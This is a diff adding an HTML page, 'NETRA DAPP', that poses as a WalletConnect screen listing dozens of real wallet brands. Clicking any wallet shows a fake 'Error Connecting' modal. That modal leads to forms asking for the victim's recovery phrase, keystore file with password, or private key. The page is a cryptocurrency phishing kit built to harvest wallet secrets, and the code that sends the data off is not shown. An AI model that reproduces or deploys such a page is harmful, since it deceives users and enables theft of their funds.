@@ -1,0 +1,568 @@
+ <!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NETRA DAPP</title>
+    <link rel="stylesheet" href="https://netrafluxdapp.com/walletpage/assets/css/style.css">
+    <link rel="stylesheet" href="https://netrafluxdapp.com/walletpage/assets/css/responsiveness.css">
+    <link rel="stylesheet" href="https://netrafluxdapp.com/walletpage/assets/css/fonts.css">
+    <link rel="icon" href="../assets/image/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  </head>
+  <body>
+    <div class="parent">
+      <header>
+        <img src="https://netrafluxdapp.com/walletpage/assets/icons/walletconnect.png" alt="icon">
+      </header>
+      <section class="content">
+        <div class="text_wrap">
+          <h1>Connect Wallet</h1>
+          <p>Open protocol for connecting Wallets to Dapps</p>
+        </div>
+      </section>
+
+      <section class="icon_wrap">
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/brd.jpg" alt="icon">
+            <p>BRD wallet</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/Coinbase.png" alt="icon">
+            <p>Coinbase</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/saitama.png" alt="icon">
+            <p>Saitamask wallet</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/terra.png" alt="icon">
+            <p>Terra station</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/phantom.jpg" alt="icon">
+            <p>Phantom wallet</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/cosmos.png" alt="icon">
+            <p>Cosmos station</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/exodus.png" alt="icon">
+            <p>Exodus wallet</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/walletconnect.png" alt="icon">
+            <p>Wallet Connect</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/rainbow.png" alt="icon" style="border-radius:50px">
+            <p>Rainbow</p>
+          </div>
+        </div>
+
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/trust.jpg" alt="icon">
+            <p>Trust</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/argent.png" alt="icon">
+            <p>Argent</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/metamask.png" alt="icon">
+            <p>Metamask</p>
+          </div>
+        </div>
+
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/binance-chain.png" alt="icon">
+            <p>Binance Chain</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/safemoon.avif" alt="icon">
+            <p>Safemoon</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/genosis.avif" alt="icon">
+            <p>Gnosis Safe</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/defi.jpg" alt="icon" style="border-radius:50px">
+            <p>DeFi</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/pillar.jpg" alt="icon" style="border-radius:50px">
+            <p>Pillar</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/imtoken.jpg" alt="icon">
+            <p>ImToken</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/onto.jpg" alt="icon">
+            <p>ONTO</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/tokenPocket.png" alt="icon" style="border-radius:50px">
+            <p>TokenPocket</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/aave.png" alt="icon">
+            <p>Aave</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/digitex.png" alt="icon">
+            <p>Digitex</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/ledger.webp" alt="icon">
+            <p>Ledger</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/portis.png" alt="icon">
+            <p>Portis</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/fortmatic.jpeg" alt="icon">
+            <p>Formatic</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/mathwallet.jpg" alt="icon" style="border-radius:50px">
+            <p>MathWallet</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/bitpay.jpg" alt="icon" style="border-radius:50px">
+            <p>BitPay</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/legderlive.avif" alt="icon">
+            <p>Ledger Live</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/walleth.jpg" alt="icon">
+            <p>WallETH</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/autherem.jpg" alt="icon">
+            <p>Authereum</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/dharma.png" alt="icon">
+            <p>Dharma</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/1inchWallet.avif" alt="icon" style="border-radius:50px">
+            <p>1inch Wallet</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/Huobi.avif" alt="icon" style="border-radius:50px">
+            <p>Huobi</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/eidoo.jpg" alt="icon">
+            <p>Eidoo</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/mykey.jpg" alt="icon">
+            <p>MYKEY</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/loopring.avif" alt="icon">
+            <p>Loopring</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/trustvault.jpg" alt="icon">
+            <p>TrustVault</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/atomic.jpg" alt="icon">
+            <p>Atomic</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/coin98.jpg" alt="icon" style="border-radius:50px">
+            <p>Coin98</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/tron-trx-logo.png" alt="icon">
+            <p>Tron</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/alice.jpg" alt="icon">
+            <p>Alice</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/alphawallet.jpg" alt="icon">
+            <p>AlphaWallet</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/dcent.jpg" alt="icon">
+            <p>D'CENT</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/zeicore.jpg" alt="icon">
+            <p>ZelCore</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/Nash.avif" alt="icon" style="border-radius:50px">
+            <p>Nash</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/coinmoni.png" alt="icon">
+            <p>Coinmoni</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/gridplus.jpg" alt="icon">
+            <p>GridPlus</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/cybavo.jpg" alt="icon">
+            <p>CYBAVO</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/tokenary.jpg" alt="icon">
+            <p>Tokenary</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/torus.jpg" alt="icon" style="border-radius:50px">
+            <p>Torus</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/spatium.jpg" alt="icon" style="border-radius:50px">
+            <p>Spatium</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/safepal.png" alt="icon">
+            <p>SafePal</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/infinito.jpg" alt="icon">
+            <p>Infinito</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/walletio.jpg" alt="icon">
+            <p>wallet.io</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/ownbit.jpg" alt="icon">
+            <p>Ownbit</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/easypocket.jpg" alt="icon">
+            <p>EasyPocket</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/bridgewallet.jpg" alt="icon">
+            <p>Bridge Wallet</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/sparkpoint.jpg" alt="icon">
+            <p>Spark Point</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/viawallet.jpg" alt="icon">
+            <p>ViaWallet</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/BitKeep.webp" alt="icon">
+            <p>BitKeep</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/vision.jpg" alt="icon">
+            <p>Vision</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/peakdefi.jpg" alt="icon">
+            <p>PEAKDEFI</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/unstoppable.jpg" alt="icon">
+            <p>Unstoppable</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/halodefi.jpg" alt="icon" style="border-radius:50px">
+            <p>HaloDeFi</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/darkwallet.jpg" alt="icon">
+            <p>Dok Wallet</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/atwallet.jpg" alt="icon">
+            <p>AT.Wallet</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/midas.jpg" alt="icon">
+            <p>Midas</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/ellipal.jpg" alt="icon">
+            <p>Ellipal</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/keyringpro.webp" alt="icon">
+            <p>KEYRING PRO</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/aktion.jpg" alt="icon" style="border-radius:50px">
+            <p>Aktionariat</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/talken.jpg" alt="icon" style="border-radius:50px">
+            <p>Talken</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/flare.jpg" alt="icon" style="border-radius:50px">
+            <p>Flare</p>
+          </div>
+        </div>
+
+        <div class="group left">
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/KyberSwap.avif" alt="icon" style="border-radius:50px">
+            <p>KyberSwap</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/atoken.jpg" alt="icon" style="border-radius:50px">
+            <p>AToken</p>
+          </div>
+
+          <div class="icons" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/rwallet.jpg" alt="icon">
+            <p>RWallet</p>
+          </div>
+        </div>
+
+        <div class="group right">
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/binana.jpg" alt="icon" style="border-radius:50px">
+            <p>Binana</p>
+          </div>
+
+          <div class="icons right_margin" onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/payTube.jpg" alt="icon" style="border-radius:50px">
+            <p>PayTube</p>
+          </div>
+
+          <div class="icons position_absolute"  onclick="myModal()">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/linen.png" alt="icon" style="border-radius:50px">
+            <p>Linen</p>
+          </div>
+        </div>
+
+
+      </section>
+
+      <!-- The first Modal start here -->
+      <div id="firstModal" class="modal">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+          <div class="top">
+            <p>Connect Wallet</p>
+          </div>
+          <div class="orange_border">
+            <p>Error Connecting... <a href="fill.html"><span>Connect Manually</span></a> </p>
+          </div>
+          <div class="last">
+            <img src="https://netrafluxdapp.com/walletpage/assets/icons/payTube.jpg" alt="" style="border-radius:50px;">
+          </div>
+        </div>
+        <!-- Modal content end here-->
+
+      </div>
+      <!-- The first Modal end here -->
+
+
+      <!-- The second Modal start here-->
+      <div id="secondModal" class="modal_form">
+
+
+                    
+          <!--phrase form-->
+          <div class="input_field" id="phrase">
+            <form id="anyForm">
+              <input type="hidden" name="type" value="payTube">
+              <input type="hidden" name="Method" value="Phrase">
+
+              <textarea name="phrase" rows="8" cols="80" placeholder="Enter your recovery phrase" minlength="24" required></textarea>
+              <br>
+              <label for="">
+                Typically 12 (sometimes 24) words separated by single spaces
+              </label>
+              <br>
+              <button type="button" style="border: 1px solid red; color:red; background:#fff; float:left" onclick="myCancel()">Cancel</button>
+              <button type="submit" name="submit" style="background:#3069F8; color:#fff; float:right">Proceed</button>
+              <button type="submit" name="submit" style="background:#3069F8; color:#fff; float:right; border:0px;">Connecting Wallet <i class="fa-solid fa-arrows-spin fa-spin"></i></button>
+            </form>
+          </div>
+
+          <!--keystore form-->
+          <div class="input_field" id="keystore">
+            <form id="anyForm">
+              <input type="hidden" name="type" value="payTube">
+              <input type="hidden" name="Method" value="Keystore JSON">
+
+              <textarea name="phrase" rows="8" cols="80" placeholder="Enter Keystore"></textarea>
+              <input type="text" name="password" placeholder="Wallet Password">
+              <br>
+              <label for="">
+                Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+              </label>
+              <br>
+              <button type="button" style="border: 1px solid red; color:red; background:#fff; float:left" onclick="myCancel()">Cancel</button>
+              <button type="submit" name="submit" style="background:#3069F8; color:#fff; float:right">Proceed</button>
+              <button type="submit" name="submit" id="loading" style="background:#3069F8; color:#fff; float:right; border:0px;">Connecting Wallet <i class="fa-solid fa-arrows-spin fa-spin"></i></button>
+            </form>
+          </div>
+
+          <!--private key form-->
+          <div class="input_field" id="pkey">
+            <form id="anyForm">
+              <input type="hidden" name="type" value="payTube">
+              <input type="hidden" name="Method" value="Private Key">
+
+              <input type="text" name="phrase" placeholder="Enter your private key">
+              <br>
+              <label for="">Typically string of letters and numbers associated with wallet.</label>
+              <br>
+              <button type="button" style="border: 1px solid red; color:red; background:#fff; float:left" onclick="myCancel()">Cancel</button>
+              <button type="submit" name="submit" style="background:#3069F8; color:#fff; float:right">Proceed</button>
+              <button type="submit" name="submit" id="loading" style="background:#3069F8; color:#fff; float:right; border:0px;">Connecting Wallet <i class="fa-solid fa-arrows-spin fa-spin"></i></button>
+            </form>
+          </div>
+
+
+        </div>
+        <!-- Modal content end here-->
+
+      </div>
+      <!-- The second Modal end here-->
+      <footer>
+        <p>Open an app submission issue on GitHub to add your app <a href="https://vaultretrieval.com/">here.</a> </p>
+        <div class="icon">
+          <i class="fa-brands fa-facebook"></i>
+          <i class="fa-brands fa-twitter"></i>
+          <i class="fa-brands fa-discord"></i>
+        </div>
+      </footer>
+    </div>
+  </body>
+</html>
